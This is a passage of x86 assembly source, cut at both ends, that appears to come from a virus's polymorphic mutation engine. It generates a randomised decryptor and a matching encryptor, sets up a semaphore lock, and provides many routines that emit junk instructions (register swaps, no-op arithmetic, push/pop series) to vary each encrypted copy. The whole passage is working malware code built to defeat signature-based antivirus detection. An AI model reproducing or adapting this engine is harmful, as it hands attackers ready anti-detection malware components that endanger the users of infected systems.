		Jz	GenPolyM_O$
		Or	Al,2h
GenPolyM_O$:	StosB
		Mov	Al,pSemReg
		Shl	Al,3h
		Or	Al,pSemReg
		Or	Al,0C0h
		StosB
		Jmp	GenPolyM_OD$
GenPolyM_OC$:	Mov	Al,83h			; (Cmp)
		StosB
		Mov	Al,pSemReg
		Or	Al,38h
		Or	Al,0C0h
		StosB
		Xor	Al,Al
		StosB
GenPolyM_OD$:	Mov	ECx,5h
		Mov	EBx,Offset GenNoFlagCom
		Call	Enumer
		Mov	Ax,840Fh		; Jz LockSem
		StosW
		Mov	EAx,pXchg
		Sub	EAx,4h
		Sub	EAx,EDi
		StosD
		Mov	Al,pBaseReg
		Mov	Ah,pSemReg
		Mov	EBx,Offset GenAnyCom
		Call	Enumer
		Mov	Al,83h			; Cmp SemReg,2h
		StosB
		Mov	Al,pSemReg
		Or	Al,0F8h
		StosB
		Mov	Al,2h
		StosB
		Mov	EBx,Offset GenNoFlagCom
		Call	Enumer
		Mov	Ax,840Fh		; Jz Done
		StosW
		Mov	pMov,EDi
		StosD
		Mov	Al,pBaseReg
		Mov	Ah,-1h
		Mov	EBx,Offset GenAnyCom
		Call	Enumer
		Mov	Al,81h			; Add BaseReg,CodeStart
		StosB
		Mov	Al,pBaseReg
		Or	Al,0C0h
		StosB
		Mov	pBaseAdd,EDi
		StosD
		Mov	Al,pBaseReg
		Mov	Ah,-1h
		Call	ENumer
		Mov	Al,1h			; Add [BaseReg][Brdr],BaseReg
		StosB
		Mov	Al,pBaseReg
		Shl	Al,3h
		Or	Al,80h
		Or	Al,pBaseReg
		StosB
		Mov	pAdd,EDi
		StosD
		Mov	Al,pBaseReg
		Mov	Ah,-1h
		Call	Enumer
		Mov	Byte Ptr pEnableEncr,1h
		Mov	Al,pBaseReg		; Encryptor, Pop BaseReg
		Or	Al,58h
		Call	StoreByte
		Mov	Al,87h			; Encryptor,
		Call	StoreByte		; Xchg BaseReg,[ESp]
		Mov	Al,pBaseReg
		Shl	Al,3h
		Or	Al,4h
		Call	StoreByte
		Mov	Al,24h
		Call	StoreByte
		Mov	Al,68h			; Encryptor, Push EncrSize
		Call	StoreByte
		Mov	EAx,[ESp]
		Sub	EAx,4h
		Call	StoreDWord
		Mov	EDx,1h			; .LoadRegisters
		Mov	Cl,pBaseReg
		Shl	EDx,Cl
		Or	EDx,10h
		Mov	Al,pBaseReg
		Mov	Ah,-1h
GenPolyM_L$:	Push	EAx
		Call	GenMovCom
		Mov	EAx,2h
		Call	Random
		Or	Al,Al
		Pop	EAx
		Jz	GenPolyM_L1$
		Push	EAx
		Call	GenNoRegCom
		Pop	EAx
GenPolyM_L1$:	Cmp	EDx,0FFh
		Jne	GenPolyM_L$
		Mov	ECx,5h
		Mov	EBx,Offset GenNoRegCom
		Call	Enumer
		Mov	Al,1h			; Encryptor, Border SetUp
		Call	StoreByte		; Add [ESp],BaseReg
		Mov	Al,pBaseReg
		Shl	Al,3h
		Or	Al,4h
		Call	StoreByte
		Mov	Al,24h
		Call	StoreByte
		Mov	pAgain,EDi
		Mov	pAgain_E,ESi
		Mov	EAx,40h			; 10h..50h commands
		Call	Random
		Add	EAx,10h
		Mov	ECx,EAx
GenPolyM_G0$:	Mov	EAx,3h			; .Decrypt
		Call	Random
		Or	Al,Al
		Mov	Al,pBaseReg
		Mov	Ah,-1h
		Jnz	GenPolyM_G1$
		Call	GenArCom
		Jmp	GenPolyM_G2$
GenPolyM_G1$:	Call	GenArMemCom
GenPolyM_G2$:	Dec	ECx
		Jnz	GenPolyM_G0$
		Mov	EAx,2h			; Add BaseReg,4h
		Call	Random
		Or	Al,Al
		Jz	GenPolyM_I2$
		Mov	Al,pBaseReg		; (Inc)
		Or	Al,40h
		Mov	ECx,4h
GenPolyM_I1$:	StosB
		Call	StoreByte
		Push	EAx
		Call	GenNoRegCom
		Pop	EAx
		Dec	ECx
		Jnz	GenPolyM_I1$
		Jmp	GenPolyM_I3$
GenPolyM_I2$:	Mov	Al,83h			; (Add)
		StosB
		Call	StoreByte
		Mov	Al,pBaseReg
		Or	Al,0C0h
		StosB
		Call	StoreByte
		Mov	Al,4h
		StosB
		Call	StoreByte
GenpolyM_I3$:	Mov	ECx,5h
		Mov	EBx,Offset GenArCom
		Mov	Al,pBaseReg
		Mov	Ah,-1h
		Call	Enumer
		Mov	Al,81h			; Cmp BaseReg,Limit
		StosB
		Mov	Al,pBaseReg
		Or	Al,0F8h
		StosB
		Mov	EAx,EDi
		Sub	EAx,pBase
		Mov	EBx,pAdd
		Mov	[EBx],EAx		; 1pass Complete Add command
		Mov	EAx,[ESp]
		Sub	EAx,4h
		StosD
		Mov	Al,3Bh			; Encryptor, Border check
		Call	StoreByte		; Cmp BaseReg,[ESp]
		Mov	Al,pBaseReg
		Shl	Al,3h
		Or	Al,4h
		Call	StoreByte
		Mov	Al,24h
		Call	StoreByte
		Mov	EBx,Offset GenNoFlagCom
		Call	Enumer
		Mov	Ax,820Fh
		StosW
		Call	StoreWord
		Mov	EAx,pAgain		; Complete Jmp Again commands
		Sub	EAx,EDi
		Sub	EAx,4h
		StosD
		Mov	EAx,pAgain_E
		Sub	EAx,ESi
		Sub	EAx,4h
		Call	StoreDWord
		Mov	Al,58h			; Complete encryptor
		Call	StoreByte
		Mov	Al,0C3h
		Call	StoreByte
		Mov	Byte Ptr pEnableEncr,0h
		Mov	EBx,Offset GenAnyCom
		Mov	Al,pBaseReg
		Mov	Ah,-1h
		Call	Enumer
		Mov	Al,81h			; Sub BaseReg,CodeSize
		StosB
		Mov	Al,pBaseReg
		Or	Al,0E8h
		StosB
		Mov	pBaseSub,EDi
		StosD
		Mov	Al,pBaseReg
		Mov	Ah,-1h
		Call	Enumer
		Mov	Al,0C7h			; Mov [BaseReg][Sem],2h
		StosB
		Mov	Al,pBaseReg
		Or	Al,80h
		StosB
		Mov	EAx,pSem
		StosD
		Mov	EAx,2h
		StosD
		Mov	EAx,EDi			; Complete Jmp Done command
		Sub	EAx,pMov
		Sub	EAx,4h
		Mov	EBx,pMov
		Mov	[EBx],EAx
		Mov	EBx,Offset GenAnyCom
		Mov	Ax,-1h
		Call	Enumer
		Mov	Al,61h			; PopA
		StosB
		Mov	EBx,Offset GenNoRegCom
		Call	Enumer
		Mov	EAx,EDi			; Complete Base To Body SetUp
		Sub	EAx,pBase
		Mov	EBx,pBaseAdd
		Mov	[EBx],EAx
		Mov	EBx,pAdd		; 2pass Complete Add command
		Sub	[EBx],EAx
		Mov	EBx,[ESp]		; Backward Body to Base SetUp
		Dec	EBx
		And	Bl,0FCh			; Rounded by 4h
		Add	EAx,EBx
		Mov	EBx,pBaseSub
		Mov	[EBx],EAx
		Pop	ECx
		Mov	EDx,EDi			; All done successfully!
		Sub	EDx,[ESp]		; EDx - decryptor size
		Mov	EBx,ESi
		Sub	EBx,[ESp][4]		; EBx - encryptor size
		Add	ESp,8h
		Ret

; ---------------------------------------------------------
GenArMemCom:	Push	EAx			; Some command that
		Mov	EAx,2h			; change memory by
		Call	Random			; base in EAx (Al)
		Or	Al,Al
		Jz	GenArMem_Imm$
		Mov	Al,2h			; Add; Sub (Reg)
		Call	Random
		Or	Al,Al
		Jz	GenArMem_R_1$
		Mov	Al,28h
GenArMem_R_1$:	Or	Al,1h
		StosB
		Xor	Al,28h
		Call	StoreByte
		Pop	EAx
		Push	EBx
		Mov	EBx,EAx
GenArMem_R_2$:	Call	GetNoESpReg
		Cmp	Al,Bl
		Je	GenArMem_R_2$
		Cmp	Al,Bh
		Je	GenArMem_R_2$
		Shl	Al,3h
		Or	Al,Bl
		Pop	EBx
		Mov	Ah,Al
		Call	GenArMem_Comp$
		Ret

GenArMem_Imm$:	Mov	Al,2h			; Add; Sub (Imm)
		Call	Random
		Add	Al,Al
		Or	Al,81h
		StosB
		Call	StoreByte
		Xchg	EAx,[ESp]
		Push	EAx
		Mov	Al,2h
		Call	Random
		Or	Al,Al
		Pop	EAx
		Jz	GenArmem_I_1$
		Or	Al,28h
GenArMem_I_1$:	Mov	Ah,Al
		Xor	Ah,28h
		Call	GenArMem_Comp$
		Pop	EAx
		Cmp	Al,83h
		Jne	GenArMem_I_2$
		Mov	Ax,100h			; Byte operand
		Call	Random
		StosB
		Call	StoreByte
		Ret
GenArMem_I_2$:	Mov	EAx,RandSeed		; DWord operand
		StosD
		Call	StoreDWord
		Ret

GenArMem_Comp$:	Push	EAx			; Compile addressing
		And	Al,7h			; modes (Corrupt EAx)
		Cmp	Al,4h
		Je	GenArMem_C_1$
		Cmp	Al,5h
		Je	GenArMem_C_2$
		Pop	EAx
		StosB
GenArMem_C0$:	Mov	Al,Ah
		Push	EAx
		And	Al,7h
		Cmp	Al,4h
		Je	GenArMem_C_3$
		Cmp	Al,5h
		Je	GenArMem_C_4$
		Pop	EAx
		Call	StoreByte
		Ret

GenArMem_C_1$:	Pop	EAx			; [ESp]
		StosB
		Mov	Al,24h
		StosB
		Jmp	GenArMem_C0$

GenArMem_C_2$:	Pop	EAx			; [EBp]
		Or	Al,40h
		And	Al,0FEh
		StosB
		Mov	Al,25h
		StosB
		Mov	Al,0h
		StosB
		Jmp	GenArMem_C0$

GenArMem_C_3$:	Pop	EAx			; [ESp]
		Call	StoreByte
		Mov	Al,24h
		Call	StoreByte
		Ret

GenArMem_C_4$:	Pop	EAx			; [EBp]
		Or	Al,40h
		And	Al,0FEh
		Call	StoreByte
		Mov	Al,25h
		Call	StoreByte
		Mov	Al,0h
		Call	StoreByte
		Ret


; ---------------------------------------------------------
GenAnyCom:	Push	EAx
		Push	EBx			; Some command that
		Push	EDx			; changes registers
		Mov	EBx,EAx			; but don't change some
GenAnyCom_0_1$:	Call	GetNoESpReg		; registers by # in Ax (Ah,Al)
		Cmp	Al,Bl			; (Corrupt EAx)
		Je	GenAnyCom_0_1$
		Cmp	Al,Bh
		Je	GenAnyCom_0_1$
		Mov	Dl,Al
GenAnyCom_0_2$:	Call	GetNoESpReg
		Cmp	Al,Bl
		Je	GenAnyCom_0_2$
		Cmp	Al,Bh
		Je	GenAnyCom_0_2$
		Mov	Ah,Dl
		Pop	EDx
		Pop	EBx
		Push	EAx
		Mov	EAx,0Ch
		Call	Random
		Or	EAx,EAx
		Jnz	GenAnyCom_1$		; ">0"
		Pop	EAx			; Ar command
		Pop	EAx
		Jmp	GenArCom

GenAnyCom_1$:	Dec	EAx
		Jnz	GenAnyCom_2$		; ">1"
		Pop	EAx			; Mov/Lea command
		Pop	EAx
		Push	EDx
		Call	GenMovCom
		Pop	EDx
		Ret

GenAnyCom_2$:	Dec	EAx
		Jnz	GenAnyCom_3$		; ">2"
		Pop	EAx			; Cbw; Cwde
		Pop	EAx
		Or	Al,Al
		Jz	GenAnyCom
		Or	Ah,Ah
		Jz	GenAnyCom
		Mov	EAx,2h
		Call	Random
		Or	Al,Al
		Jz	GenAnyCom_2_1$
		Mov	Al,66h
		StosB
GenAnyCom_2_1$:	Mov	Al,98h
		StosB
		Ret

GenAnyCom_3$:	Dec	EAx
		Jnz	GenAnyCom_4$		; ">3"
		Pop	EAx			; Cwd; Cdq
		Pop	EAx
		Or	Al,Al
		Jz	GenAnyCom
		Or	Ah,Ah
		Jz	GenAnyCom
		Cmp	Al,2h
		Je	GenAnyCom
		Cmp	Ah,2h
		Je	GenAnyCom
		Mov	EAx,2h
		Call	Random
		Or	Al,Al
		Jz	GenAnyCom_3_1$
		Mov	Al,66h
		StosB
GenAnyCom_3_1$:	Mov	Al,99h
		StosB
		Ret

GenAnyCom_4$:	Dec	EAx
		Jnz	GenAnyCom_5$		; ">4"
		Pop	EAx			; Aas; Aaa; Daa; Das
		Pop	EAx
		Or	Al,Al
		Jz	GenAnyCom
		Or	Ah,Ah
		Jz	GenAnyCom
		Mov	EAx,4h
		Call	Random
		Shl	Al,3h
		Or	Al,27h
		StosB
		Ret

GenAnyCom_5$:	Dec	EAx
		Jnz	GenAnyCom_6$		; ">5"
		Pop	EAx			; Aad; Aam
		Pop	EAx			; operand must be <>0
		Or	Al,Al
		Jz	GenAnyCom
		Or	Ah,Ah
		Jz	GenAnyCom
		Mov	EAx,2h
		Call	Random
		Or	Al,0D4h
		StosB
		Mov	Al,0FFh
		Call	Random
		Inc	Al
		StosB
		Ret

GenAnyCom_6$:	Dec	EAx
		Jnz	GenAnyCom_7$		; ">6"
		Pop	EAx			; Loop $+2
		Pop	EAx
		Cmp	Al,1h
		Je	GenAnyCom
		Cmp	Ah,1h
		Je	GenAnyCom
		Mov	Ax,0E2h
		StosW
		Ret

GenAnyCom_7$:	Dec	EAx
		Jnz	GenAnyCom_8$		; ">7"
		Mov	Al,0D1h			; Rol; Shl;
		StosB				; Ror; Shr; Sar;
		Pop	EAx			; Rcl; Rcr
		Push	EBx
		Mov	EBx,EAx
GenAnyCom_7_0$:	Mov	EAx,8h
		Call	Random
		Cmp	Al,6h
		Je	GenAnyCom_7_0$
		Shl	Al,3h
		Or	Al,Bl
		Or	Al,0C0h
		StosB
		Pop	EBx
		Pop	EAx
		Ret

GenAnyCom_8$:	Dec	EAx
		Jnz	GenAnyCom_9$		; ">8"
		Mov	Al,89h			; Mov Reg1,Reg2
		StosB
		Pop	EAx
		Shl	Al,3h
		Or	Al,Ah
		Or	Al,0C0h
		StosB
		Pop	EAx
		Ret

GenAnyCom_9$:	Dec	EAx
		Jnz	GenAnyCom_10$		; ">9"
		Mov	Al,4h			; Adc; Sbb; Or; And
		Call	Random
		Inc	Al
		Shl	Al,3h
		Or	Al,1h
		Push	EBx
		Mov	EBx,EAx
		Mov	Al,2h
		Call	Random
		Shl	Al,1h
		Or	Al,Bl
		Pop	EBx
		StosB
		Pop	EAx
		Shl	Al,3h
		Or	Al,Ah
		Or	Al,0C0h
		StosB
		Pop	EAx
		Ret

GenAnyCom_10$:	Dec	EAx
		Jnz	GenAnyCom_11$		; ">10"
		Mov	Al,2h			; Adc; Sbb; Or; And [Imm]
		Call	Random
		Or	Al,Al
		Pop	EAx
		PushF
		Push	EAx
		Jz	GenAnyCom_10a$
		Mov	Al,66h
		StosB
GenAnyCom_10a$:	Mov	EAx,2h
		Call	Random
		Shl	Al,1h
		Or	Al,81h
		StosB
		Xchg	EAx,[ESp]
		Push	EBx
		Mov	EBx,EAx
		Mov	EAx,4h
		Call	Random
		Inc	EAx
		Shl	Al,3h
		Or	Al,0C0h
		Or	Al,Bl
		Pop	EBx
		StosB
		Pop	EAx
		Cmp	Al,83h
		Je	GenAnyCom_10b$
		Mov	Ax,Word Ptr RandSeed	; Imm16
		StosW
		PopF
		Jnz	GenAnyCom_10c$
		Mov	Ax,Word Ptr RandSeed+2	; Imm32
		StosW
GenAnyCom_10c$:	Pop	EAx
		Ret

GenAnyCom_10b$:	Mov	EAx,100h		; Imm8
		Call	Random
		StosB
		PopF
		Pop	EAx
		Ret

GenAnyCom_11$:	Pop	EAx
		Or	Al,50h			; Push Reg1 / Pop Reg2
		StosB
		Push	EAx			; Seria of commands
		Mov	EAx,5h
		Call	Random
		Push	ECx
		Mov	ECx,EAx
		Or	ECx,ECx
		Jz	GenAnyCm_11_1$
GenAnyCm_11_1$:	Mov	EAx,[ESp][2*4]
		Call	GenAnyCom
		Dec	ECx
		Jnz	GenAnyCm_11_2$
GenAnyCm_11_2$:	Pop	ECx
		Pop	EAx
		Mov	Al,Ah
		Or	Al,58h
		StosB
		Pop	EAx
		Ret

; ---------------------------------------------------------
GenArCom:	Push	EAx
		Push	EBx			; Some command that pretty
		Push	EDx			; changes registers
		Mov	EBx,EAx			; but don't change some
GenArCom_0_1$:	Call	GetNoESpReg		; registers by # in Ax (Ah,Al)
		Cmp	Al,Bl			; (Corrupt EAx)
		Je	GenArCom_0_1$
		Cmp	Al,Bh
		Je	GenArCom_0_1$
		Mov	Dl,Al
GenArCom_0_2$:	Call	GetNoESpReg
		Cmp	Al,Bl
		Je	GenArCom_0_2$
		Cmp	Al,Bh
		Je	GenArCom_0_2$
		Shl	Al,3h
		Or	Al,Dl
		Or	Al,0C0h
		Pop	EDx
		Pop	EBx
		Push	EAx
		Mov	EAx,7h
		Call	Random
		Or	EAx,EAx
		Jnz	GenArCom_1$		; ">0"
		Pop	EAx			; NoReg command
		Pop	EAx
		Jmp	GenNoRegCom

GenArCom_1$:	Dec	EAx
		Jnz	GenArCom_2$		; ">1"
		Mov	Al,87h			; Xchg Reg1,Reg2
		StosB
		Call	StoreByte
		Pop	EAx
		StosB
		Call	StoreByte
		Pop	EAx
		Ret

GenArCom_2$:	Dec	EAx
		Jnz	GenArCom_3$		; ">2"
		Pop	EAx			; Push Reg1; Push Reg2
		Mov	Ah,Al			; Pop Reg2; Pop Reg1
		And	Al,7h
		Or	Al,50h
		StosB
		Call	StoreByte
		Mov	Al,Ah
		Shr	Al,3h
		And	Al,7h
		Or	Al,50h
		StosB
		Call	StoreByte
		Push	ECx			; Seria of commands
		Push	EAx
		Mov	EAx,5h
		Call	Random
		Mov	ECx,EAx
		Or	ECx,ECx
		Jz	GenArCom_2_1$
GenArCom_2_2$:	Mov	EAx,[ESp][2*4]
		Call	GenArCom
		Dec	ECx
		Jnz	GenArCom_2_2$
GenArCom_2_1$:	Pop	EAx
		Pop	ECx
		Mov	Al,Ah
		And	Al,7h
		Or	Al,58h
		StosB
		Call	StoreByte
		Mov	Al,Ah
		Shr	Al,3h
		And	Al,7h
		Or	Al,58h
		StosB
		Call	StoreByte
		Pop	EAx
		Ret

GenArCom_3$:	Dec	EAx
		Jnz	GenArCom_4$		; ">3"
		Mov	EAx,2h			; Xor Reg1,Reg2
		Call	Random
		Or	Al,38h
		Or	Al,1h
		StosB
		Call	StoreByte
		Pop	EAx
		StosB
		Call	StoreByte
		Pop	EAx
		Ret

GenArCom_4$:	Dec	EAx
		Jnz	GenArCom_5$		; ">4"
		Mov	Al,2h			; Add Reg1,Reg2
		Call	Random			; Sub Reg1,Reg2
		Or	Al,Al
		Jz	GenArCom_4_1$
		Mov	Al,28h
GenArCom_4_1$:	Or	Al,1h
		Push	EBx
		Mov	EBx,EAx
		Mov	Al,2h
		Call	Random
		Or	Al,Bl
		StosB
		Call	StoreByte
		Pop	EBx
		Pop	EAx
		StosB
		Call	StoreByte
		Pop	EAx
		Ret

GenArCom_5$:	Dec	EAx
		Jnz	GenArCom_6$		; ">5"
		Mov	Al,2h			; Add; Sub; Xor [Imm]
		Call	Random
		Or	Al,Al
		Pop	EAx
		PushF
		Push	EAx
		Jz	GenArCom_5_1$
		Mov	Al,66h
		StosB
		Call	StoreByte
GenArCom_5_1$:	Mov	EAx,2h
		Call	Random
		Shl	Al,1h
		Or	Al,81h
		StosB
		Call	StoreByte
		Xchg	EAx,[ESp]
		Push	EAx
		Mov	EAx,3h
		Call	Random
		Shl	Al,3h
		Push	ECx
		Mov	Cl,Al
		Mov	EAx,002830h
		Shr	EAx,Cl
		Pop	ECx
		Xchg	EBx,[ESp]
		And	Bl,7h
		Or	Al,Bl
		Or	Al,0C0h
		StosB
		Call	StoreByte
		Pop	EBx
		Pop	EAx
		Cmp	Al,83h
		Je	GenArCom_5_2$
		Mov	Ax,Word Ptr RandSeed
		StosW
		Call	StoreWord		; Imm16
		PopF
		Jnz	GenArCom_5_3$
		Mov	Ax,Word Ptr RandSeed+2	; Imm32
		StosW
		Call	StoreWord
GenArCom_5_3$:	Pop	EAx
		Ret

GenArCom_5_2$:	Mov	EAx,100h		; Imm8
		Call	Random
		StosB
		Call	StoreByte
		PopF
		Pop	EAx
		Ret

GenArCom_6$:	Mov	Al,0D1h			; Rol Reg,1
		StosB				; Ror Reg,1
		Call	StoreByte
		Pop	EAx
		Push	EBx
		Mov	EBx,EAx
		Mov	EAx,2h
		Call	Random
		Shl	Al,3h
		And	Bl,0C7h
		Or	Al,Bl
		StosB
		Call	StoreByte
		Pop	EBx
		Pop	EAx
		Ret

; ---------------------------------------------------------
GenMovCom:	Push	EBx			; Some command that loads
		Mov	EBx,EAx			; registers by values
GenMovCom_1$:	Call	GetNoESpReg		; but don't change some
		Cmp	Al,Bl			; register by # in Ax (Ah,Al)
		Je	GenMovCom_1$		; set bit in mask
		Cmp	Al,Bh			; transferred in EDx
		Je	GenMovCom_1$		; (Corrupt EAx)
		Mov	EBx,EAx
		Push	ECx
		Mov	Cl,Al
		Mov	EAx,1
		Shl	EAx,Cl
		Or	EDx,EAx			; Set bit in mask
		Pop	ECx
		Mov	EAx,2h
		Call	Random
		Or	Al,Al
		Jz	GenMovCom_Lea$
		Mov	Al,Bl			; Mov style
		Or	Al,0B8h
		StosB
		Call	StoreByte
		Mov	EAx,RandSeed
		StosD
		Call	StoreDWord
		Pop	EBx
		Ret

GenMovCom_Lea$:	Mov	Al,8Dh			; Lea style
		StosB
		Call	StoreByte
		Mov	Al,Bl
		Shl	Al,3h
		Or	Al,5h
		StosB
		Call	StoreByte
		Mov	EAx,RandSeed
		StosD
		Call	StoreDWord
		Pop	EBx
		Ret

; ---------------------------------------------------------
GenNoRegCom:	Xor	EAx,EAx			; Some command that don't
		Mov	Al,0Eh			; change registers
		Call	Random			; (Corrupt EAx)
		Or	EAx,EAx
		Jnz	GenNoReg_1$		; ">0"
		Call	GenNoFlagCom		; NoFlag command
		Ret

GenNoReg_1$:	Dec	EAx
		Jnz	GenNoReg_2$		; ">1"
		Mov	Al,2h			; Clc or Stc
		Call	Random
		Or	Al,0F8h
		StosB
		Ret

GenNoReg_2$:	Dec	EAx
		Jnz	GenNoReg_3$		; ">2"
		Mov	Al,2h			; Cld or Std
		Call	Random
		Or	Al,0FCh
		StosB
		Ret

GenNoReg_3$:	Dec	EAx
		Jnz	GenNoReg_4$		; ">3"
		Mov	Al,0F5h			; Cmc
		StosB
		Ret

GenNoReg_4$:	Dec	EAx
		Jnz	GenNoReg_5$		; ">4"
		Mov	Al,4h			; Or Reg,Reg
		Call	Random
		Or	Al,8h
		StosB
		Call	GetEqRegs
		StosB
		Ret

GenNoReg_5$:	Dec	EAx
		Jnz	GenNoReg_6$		; ">5"
		Mov	Al,4h			; And Reg,Reg
		Call	Random
		Or	Al,20h
		StosB
		Call	GetEqRegs
		StosB
		Ret

GenNoReg_6$:	Dec	EAx
		Jnz	GenNoReg_7$		; ">6"
		Mov	Al,4h			; Cmp Reg1,Reg2
		Call	Random
		Or	Al,38h
		StosB
		Call	GetNoEqRegs
		StosB
		Ret

GenNoReg_7$:	Dec	EAx
		Jnz	GenNoReg_8$		; ">7"
		Mov	Al,2h			; Test Reg1,Reg2
		Call	Random
		Or	Al,84h
		StosB
		Call	GetNoEqRegs
		StosB
		Ret

GenNoReg_8$:	Dec	EAx
		Jnz	GenNoReg_9$		; ">8"
		Mov	Al,2h			; Test Reg,0XXXXh
		Call	Random
		Or	Al,0F6h
		StosB
		Push	EAx
		Call	GetReg
		Or	Al,0C0h
		StosB
		Pop	EAx
		Cmp	Al,0F6h
		Jne	GenNoReg_8_1$
		Mov	EAx,100h
		Call	Random
		StosB
		Ret
GenNoReg_8_1$:	Mov	EAx,RandSeed
		StosD
		Ret

GenNoReg_9$:	Dec	EAx
		Jnz	GenNoReg_10$		; ">9"
		Mov	Al,2h			; Cmp Reg,0XXXXh
		Call	Random
		Or	Al,80h
		StosB
		Push	EAx
		Call	GetReg
		Or	Al,0F8h
		StosB
		Pop	EAx
		Cmp	Al,80h
		Jne	GenNoReg_9_1$
		Mov	EAx,100h
		Call	Random
		StosB
		Ret
GenNoReg_9_1$:	Mov	EAx,RandSeed
		StosD
		Ret

GenNoReg_10$:	Dec	EAx
		Jnz	GenNoReg_11$		; ">10"
		Call	GetNoESpReg		; Inc Reg / Dec Reg
		Or	Al,40h
		Push	EBx
		Mov	Bl,Al
		Mov	Al,2h
		Call	Random
		Shl	Al,3h
		Or	Al,Bl
		Pop	EBx
		StosB
		Push	EAx			; Some seria of commands
		Push	ECx
		Mov	EAx,5h			; How many. . .
		Call	Random
		Mov	ECx,EAx
		Or	ECx,ECx
		Jz	GenNoReg_10_1$
GenNoReg_10_2$:	Call	GenNoRegCom
		Dec	ECx
		Jnz	GenNoReg_10_2$
GenNoReg_10_1$:	Pop	ECx
		Pop	EAx
		Xor	Al,8h
		StosB
		Ret

GenNoReg_11$:	Dec	EAx
		Jnz	GenNoReg_12$		; ">11"
		Mov	Al,2h			; Rol Reg,1 / Ror Reg,1
		Call	Random			; Inc Reg,1 / Dec Reg,1
		Push	EAx
		Mov	Al,2h
		Call	Random
		Or	Al,Al
		Pop	EAx
		Mov	Ah,0D0h
		Je	GenNoReg_11_0$
		Mov	Ah,0FEh
GenNoReg_11_0$:	Or	Al,Ah
		Push	EAx
		StosB
		Call	GetNoESpReg
		Or	Al,0C0h
		Push	EBx
		Mov	Bl,Al
		Mov	Al,2h
		Call	Random
		Shl	Al,3h
		Or	Al,Bl
		Pop	EBx
		StosB
		Push	EAx			; Some seria of commands
		Push	ECx
		Mov	EAx,5h			; How many. . .
		Call	Random
		Mov	ECx,EAx
		Or	ECx,ECx
		Jz	GenNoReg_11_1$
GenNoReg_11_2$:	Call	GenNoRegCom
		Dec	ECx
		Jnz	GenNoReg_11_2$
GenNoReg_11_1$:	Pop	ECx
		Pop	EAx
		Xchg	EAx,[ESp]
		StosB
		Pop	EAx
		Xor	Al,8h
		StosB
		Ret

GenNoReg_12$:	Dec	EAx
		Jnz	GenNoReg_13$		; ">12"
		Mov	Al,2h			; Xchg Reg1,Reg2 (Twice)
		Call	Random			; (without ESp)
		Or	Al,86h
		Push	EBx
		Mov	Bl,Al
		Call	GetNoEqRegs0
		Mov	Ah,Bl
		Pop	EBx
		Xchg	Ah,Al
		StosW
		Push	EAx			; Seria ;-) from One command
		Call	GenNoRegCom
		Pop	EAx
		StosW
		Ret

GenNoReg_13$:	Mov	Al,2h			; Add; Sub; Xor [Imm]
		Call	Random			; Sub; Add; Xor [Imm]
		Or	Al,Al
		PushF				; _Prefix
		Jz	GenNoReg_13_1$
		Mov	Al,66h
		StosB
GenNoReg_13_1$:	Mov	Al,4h
		Call	Random
		Or	Al,80h
		StosB
		Push	EAx			; _ComByte
		Mov	Al,3h
		Call	Random
		Shl	Al,3h
		Push	EAx			; _ComNum
		Push	ECx
		Mov	Cl,Al
		Mov	EAx,002830h
		Shr	EAx,Cl
		Mov	ECx,EAx
		Call	GetNoESpReg
		Or	Cl,Al
		Xchg	EAx,[ESp]		; _RegNum
		Xchg	EAx,ECx
		Or	Al,0C0h
		StosB
		Mov	EAx,RandSeed
		Push	EAx			; _MagicDWord
		Mov	EAx,[ESp][3*4]
		Cmp	Al,81h
		Jne	GenNoReg13_2$
		Mov	EAx,[ESp]
		StosW
		Mov	EAx,[ESp][4*4]
		Push	EAx
		PopF
		Jnz	GenNoReg13_3$
		Mov	EAx,[ESp]
		Shr	EAx,16
		StosW
		Jmp	GenNoReg13_3$

GenNoReg13_2$:	Mov	EAx,[ESp]
		StosB

GenNoReg13_3$:	Push	ECx			; Seria of commands. . .
		Mov	EAx,5h
		Call	Random
		Mov	ECx,EAx
		Or	ECx,ECx
		Jz	GenNoReg13_4$
GenNoReg13_5$:	Call	GenNoRegCom
		Dec	ECx
		Jnz	GenNoReg13_5$
GenNoReg13_4$:	Pop	ECx

		Mov	EAx,[ESp][4*4]		; Mirror command
		Push	EAx
		PopF
		Jz	GenNoReg13_6$
		Mov	Al,66h
		StosB
GenNoReg13_6$:	Mov	EAx,[ESp][3*4]
		StosB
		Push	ECx
		Mov	ECx,[ESp][2*4]+4
		Mov	EAx,280030h
		Shr	EAx,Cl
		Mov	ECx,EAx
		Mov	EAx,[ESp][1*4]+4
		Or	Al,Cl
		Or	Al,0C0h
		StosB
		Pop	ECx
		Mov	EAx,[ESp][3*4]
		Cmp	Al,81h
		Jne	GenNoReg13_7$
		Mov	EAx,[ESp]
		StosW
		Mov	EAx,[ESp][4*4]
		Push	EAx
		PopF
		Jnz	GenNoReg13_8$
		Mov	EAx,[ESp]
		Shr	EAx,16
		StosW
GenNoReg13_8$:	Add	ESp,5*4
		Ret

GenNoReg13_7$:	Mov	EAx,[ESp]
		StosB
		Add	ESp,5*4
		Ret

; ---------------------------------------------------------
GenNoFlagCom:	Xor	EAx,EAx			; Some command that don't
		Mov	Al,0Ah			; change anything
		Call	Random			; (Corrupt EAx)
		Or	EAx,EAx
		Jnz	GenNoFlag_1$		; ">0"
		Mov	Al,90h			; Nop command
		StosB
		Ret

GenNoFlag_1$:	Dec	EAx
		Jnz	GenNoFlag_2$		; ">1"
GenNoFlag_1_1$:	Mov	Al,4h			; Segments DS: ES: SS:
		Call	Random			; Without CS: !
		Shl	Al,3h
		Or	Al,26h
		Cmp	Al,2Eh
		Je	GenNoFlag_1_1$
		StosB
		Ret

GenNoFlag_2$:	Dec	EAx
		Jnz	GenNoFlag_3$		; ">2"
		Mov	Ax,0E3h			; JECxZ $+2
		StosW
		Ret

GenNoFlag_3$:	Dec	EAx
		Jnz	GenNoFlag_4$		; ">3"
		Mov	Al,2h			; Xchg Reg,Reg
		Call	Random
		Or	Al,86h
		StosB
		Call	GetEqRegs
		StosB
		Ret

GenNoFlag_4$:	Dec	EAx
		Jnz	GenNoFlag_5$		; ">4"
		Mov	Al,4h			; Mov Reg,Reg
		Call	Random
		Or	Al,88h
		StosB
		Call	GetEqRegs
		StosB
		Ret

GenNoFlag_5$:	Dec	EAx
		Jnz	GenNoFlag_6$		; ">5"
		Call	GetNoESpReg		; Push Reg / Pop Reg
		Or	Al,50h
		StosB
		Push	EAx			; Some seria of commands
		Push	ECx
		Mov	EAx,5h			; How many. . .
		Call	Random
		Mov	ECx,EAx
		Or	ECx,ECx
		Jz	GenNoFlag_5_1$
GenNoFlag_5_2$:	Call	GenNoFlagCom
		Dec	ECx
		Jnz	GenNoFlag_5_2$
